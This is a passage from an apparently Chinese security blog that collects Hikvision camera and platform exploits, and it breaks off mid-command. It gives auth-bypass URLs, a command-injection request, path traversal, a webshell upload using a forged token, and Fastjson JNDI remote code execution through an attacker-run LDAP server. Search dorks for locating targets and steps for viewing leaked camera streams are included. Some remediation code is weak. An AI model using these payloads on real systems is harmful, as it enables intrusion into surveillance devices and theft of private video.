<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/Security/users?auth=YWRtaW46MTEKYWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>auth内容是admin:11的base64编码。</p>
<p>获取系统监控快照，不需要进行身份验证。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/onvif-http/snapshot?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>下载摄像机配置文件，通过脚本解密配置文件获得账密信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/System/configurationFile?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>用hex编辑器打开下载的configurationFile文件发现是加密后的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor</span><br><span class="line">python3 decrypt_configurationFile.py configurationFile</span><br></pre></td></tr></table></figure>

<h4 id="cve-2021-36260"><a href="#cve-2021-36260" class="headerlink" title="cve-2021-36260"></a>cve-2021-36260</h4><p>影响范围</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img640" alt="图片"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652093950.png" alt="1686652093950"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652112690.png" alt="1686652112690"></p>
<p>漏洞poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUT /SDK/webLanguage HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line">AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 89</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;language&gt;$(ifconfig -a &gt;</span><br><span class="line">webLib/dd.asp)&lt;/language&gt;</span><br></pre></td></tr></table></figure>

<h4 id="海康威视流媒体管理服务器后台任意文件读取漏洞"><a href="#海康威视流媒体管理服务器后台任意文件读取漏洞" class="headerlink" title="海康威视流媒体管理服务器后台任意文件读取漏洞"></a>海康威视流媒体管理服务器后台任意文件读取漏洞</h4><p><strong>影响范围</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">流媒体管理服务器 V2.3.5</span><br></pre></td></tr></table></figure>

<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.title=&quot;流媒体管理服务器&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini</span><br></pre></td></tr></table></figure>

<p>fileName未输入文件名时，返回包会报错，错误信息中包含网站的部分绝对路径信息，经过路径构造可以获取当前php文件的内容</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652380656.png" alt="1686652380656"></p>
<p>漏洞修复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>php.ini 配置 open_basedir（针对PHP应用程序）。</span><br><span class="line"><span class="number">2.</span>用户输入配置白名单，对文件下载类型进行检查，判断是否为允许下载类型。</span><br><span class="line"><span class="number">3.</span>过滤路径回溯符../，或者直接将..替换成空。对参数进行过滤，依次过滤“.”、“..”、“/”、“\”等字符。</span><br><span class="line"><span class="number">4.</span>对于下载文件的目录做好限制，只能下载定目录下的文件，或者将要下载的资源文件路径存入数据库，附件下载时定数据库中的id即可，id即对应的资源。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileReader</span> &#123;</span><br><span class="line">    <span class="comment">// 正则表达式，用于过滤路径中的 ../ 字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">SAFE_PATH_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;[^/]+/\\.\\./&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全读取文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] readSafely(String path) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 将路径中的 ../ 替换为空字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">safePath</span> <span class="operator">=</span> SAFE_PATH_PATTERN.matcher(path).replaceAll(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用安全路径读取文件</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">filePath</span> <span class="operator">=</span> Paths.get(safePath);</span><br><span class="line">        <span class="keyword">return</span> Files.readAllBytes(filePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">这段代码中使用了正则表达式来过滤路径中的 ../ 字符串，确保文件只能被读取到预期的位置。</span><br><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] fileData = FileReader.readSafely(<span class="string">&quot;/path/to/file&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="comment">// 处理异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="海康威视iVMS综合安防系统任意文件上传漏洞（0day）"><a href="#海康威视iVMS综合安防系统任意文件上传漏洞（0day）" class="headerlink" title="海康威视iVMS综合安防系统任意文件上传漏洞（0day）"></a><strong>海康威视iVMS综合安防系统任意文件上传漏洞（0day）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视iVMS系统存在在野 0day 漏洞，攻击者通过获取密钥任意构造token，请求&#x2F;resourceOperations&#x2F;upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。</p>
<p><strong>影响范围</strong></p>
<p>1.海康威视综合安防系统iVMS-5000</p>
<p>2.海康威视综合安防系统 iVMS-8700</p>
<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.body=&quot;/views/home/file/installPackage.rar&quot;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞poc</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;fileUploader&quot;</span>;filename=<span class="string">&quot;1.jsp&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://you-ip</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证  （内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）</p>
<p>secretkey是代码里写死的（默认值：secretKeyIbuilding）</p>
<p>token值需要进行MD5加密（32位大写）</p>
<p>组合：token&#x3D;MD5(url+”secretKeyIbuilding”)</p>
<blockquote>
<p>md5加密 ：<a href="http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding">http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding</a></p>
</blockquote>
<p>重新验证，构造文件上传poyload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUploader&quot;;filename=&quot;1.jsp&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>显示上传成功且返回了resourceUuid值</p>
<p>验证路径：<a href="http://url/eps/upload/resourceUuid%E7%9A%84%E5%80%BC.jsp">http://url/eps/upload/resourceUuid的值.jsp</a></p>
<h4 id="海康威视IVMS系统任意文件上传漏洞"><a href="#海康威视IVMS系统任意文件上传漏洞" class="headerlink" title="海康威视IVMS系统任意文件上传漏洞"></a><strong>海康威视IVMS系统任意文件上传漏洞</strong></h4><p><strong>检测POC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sccmdaveli/hikvision-poc</span><br></pre></td></tr></table></figure>

<p><strong>漏洞修复</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1.</span>在服务器后端控制上传文件类型，处理时强制使用随机数改写文件名和文件路径,不要使用用户自定义的文件名和文件路径。</span><br><span class="line"><span class="number">2.</span>在服务器后端建议使用白名单的方法对上传的文件进行过滤，上传的目录不进行解析，只提供下载权限。</span><br><span class="line"><span class="number">3.</span>开源编辑器上传漏洞：若新版编辑器已修复漏洞，请更新编辑器版本。</span><br><span class="line"><span class="number">4.</span>除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Part;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALLOWED_FILE_TYPES</span> <span class="operator">=</span> <span class="string">&quot;image/jpeg,image/png,image/gif&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="comment">// 获取上传的文件</span></span><br><span class="line">    <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件类型是否被允许</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileType</span> <span class="operator">=</span> filePart.getContentType();</span><br><span class="line">    <span class="keyword">if</span> (!ALLOWED_FILE_TYPES.contains(fileType)) &#123;</span><br><span class="line">      response.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;Invalid file type.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用随机数改写文件名和文件路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> generateRandomFileName(filePart.getSubmittedFileName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span> + File.separator + fileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存文件</span></span><br><span class="line">    filePart.write(filePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回响应</span></span><br><span class="line">    response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">generateRandomFileName</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">randomNumber</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line">    String[] fileNameParts = fileName.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileExtension</span> <span class="operator">=</span> fileNameParts[fileNameParts.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> randomNumber + <span class="string">&quot;.&quot;</span> + fileExtension;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">在上面的代码中，我们首先使用 getPart 方法获取上传的文件。然后检查文件类型是否在允许的文件类型列表中。如果不在，则发送错误响应。否则，我们使用随机数改写文件名和文件路径。最后，我们使用 write 方法将文件写入磁盘，并返回响应。</span><br></pre></td></tr></table></figure>

<h4 id="海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）"><a href="#海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）" class="headerlink" title="海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）"></a><strong>海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视综合安防管理平台存在Fastjson远程命令执行漏洞，该漏洞可执行系统命令，直接获取服务器权限。</p>
<p><strong>搜索引擎语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;HIKVISION-综合安防管理平台&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://2vyvoa.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>先看看能不能连dnslog服务器，如果dnslog服务器收到请求，则大概率存在命令执行漏洞 </p>
<p>确定dnslog能收到请求之后，使用工具JNDIExploit-1.2-SNAPSHOT.jar 进一步利用。把该工具上传到公网服务器后，执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 你的公网服务器ip</span><br></pre></td></tr></table></figure>

<p>记得对外开放1389 8080端口哦 </p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185125656.png" alt="image-20230613185125656"></p>
<p>然后就在数据包的头部加上 cmd: whoami  这里whoami也可以改成你想执行的命令</p>
<p>存在注入的地方改成  ldap:&#x2F;&#x2F;这里是的你公网服务器ip地址:1389&#x2F;Basic&#x2F;TomcatEcho</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://这里是的你公网服务器ip地址:1389/Basic/TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行whoami</p>
<p><strong>漏洞修复</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/</span><br></pre></td></tr></table></figure>

<h4 id="海康威视AK信息泄露漏洞"><a href="#海康威视AK信息泄露漏洞" class="headerlink" title="海康威视AK信息泄露漏洞"></a><strong>海康威视AK信息泄露漏洞</strong></h4><p>进行js多次查看发现存在jsconfig的调用。</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185345443.png" alt="image-20230613185345443"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185405052.png" alt="image-20230613185405052"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185415011.png" alt="image-20230613185415011"></p>
<p>appkey就是user 由一个8位数数构成:23412412</p>
<p>Secret就是passwd，由21位的密钥构成:QfQPss5GOac9Bjxkfuv3</p>
<p>官方提供api接口文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://open.hikvision.com/docs/docId?productId=5c67f1e2f05948198c909700&amp;version=%2Ff95e951cefc54578b523d1738f65f0a1&amp;curNodeId=16741aecc05944a6b0cd1341d68e4546</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./api/resource/v2/encodeDevice/search接口,获取权限的编码设备列表</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2./api/resource/v1/cameras 获取cameraIndexCode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3./api/video/v1/manualCapture 带cameraIndexCode去获取摄像头的Picurl</span><br></pre></td></tr></table></figure>

<p><strong>利用rtsp协议去访问</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用/api/video/v2/cameras/previewURLs 接口 。获取获取rtsp协议摄像</span><br></pre></td></tr></table></figure>

<p><strong>这里借助借助VLC media player 播放去访问rtsp协议摄像头</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185641997.png" alt="image-20230613185641997"></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>代码演示</title>
    <url>/2023/06/11/%E6%BC%94%E7%A4%BA/%E6%BC%94%E7%A4%BA/</url>
    <content><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span> ()&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yanshi&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>json格式的数据，@type，rmi和一些出网行为<br>shiro<br>550<br>cookie中的rememberme&#x3D;deleteme<br>命令-序列化-AES加密-&gt;base64-&gt;rememberme<br>721<br>AES-128-CBC  加密的cookike  rememberme 不要key<br>通过padding 加密生成的代码构造rememberme<br>log4j<br>{jndi:ldap&#x2F;&#x2F;}<br>{jndi:rmi&#x2F;&#x2F;}</p>
<h5 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h5><p>牛客网</p>
<p>weblogic</p>
<p>fastjson</p>
<p>框架</p>
<p>mybatis&#x2F;puls</p>
<p>任意文件</p>
<p>修复办法</p>
<p>ssm</p>
<p>spring cloud</p>
<p>spring s</p>
]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>配置</tag>
        <tag>演示</tag>
      </tags>
  </entry>
  <entry>
    <title>加固和应急响应</title>
    <url>/2023/06/16/%E5%8A%A0%E5%9B%BA%E5%92%8C%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h4 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h4><p>国标</p>
<p>GB&#x2F;T25058 信息安全技术 信息系统安全等级保护实施指南</p>
<p>GB&#x2F;T22240 信息安全技术 信息系统安全等级保护定级指南</p>
<p>GB&#x2F;T22239 信息安全技术 网络安全等级保护基本要求</p>
<p>GB&#x2F;T25070 信息安全技术 网络安全等级保护安全设计技术要求</p>
<p>GB&#x2F;T28449 信息安全技术  网络安全等级保护评测过程指南</p>
<h5 id="版本升级"><a href="#版本升级" class="headerlink" title="版本升级"></a>版本升级</h5><p>windows有弹框，linux没提示</p>
<h5 id="关闭端口服务"><a href="#关闭端口服务" class="headerlink" title="关闭端口服务"></a>关闭端口服务</h5><p>端口能不开就不开，最小安装原则</p>
<h5 id="修改配置项"><a href="#修改配置项" class="headerlink" title="修改配置项"></a>修改配置项</h5><p>修改安全配置，参数，可以为网络和 应用提供必要的安全防护</p>
<h5 id="主机和网络ACL策略"><a href="#主机和网络ACL策略" class="headerlink" title="主机和网络ACL策略"></a>主机和网络ACL策略</h5><p>iptables,对于流量进行严格的控制，白名单</p>
<h5 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h5><h5 id="部署设备防护"><a href="#部署设备防护" class="headerlink" title="部署设备防护"></a>部署设备防护</h5><h4 id="linux加固方向"><a href="#linux加固方向" class="headerlink" title="linux加固方向"></a>linux加固方向</h4><h5 id="账号管理和认证授权"><a href="#账号管理和认证授权" class="headerlink" title="账号管理和认证授权"></a>账号管理和认证授权</h5><h6 id="修改目录权限"><a href="#修改目录权限" class="headerlink" title="修改目录权限"></a>修改目录权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 750 directory</span><br><span class="line"><span class="comment"># 默认目录权限是755   文件权限是644</span></span><br><span class="line"><span class="comment"># 改为750 640或者 700 600 </span></span><br><span class="line"><span class="built_in">chown</span> username:groupname directory</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改账户组文件的权限</span></span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/passwd</span><br><span class="line"><span class="built_in">chmod</span> 600 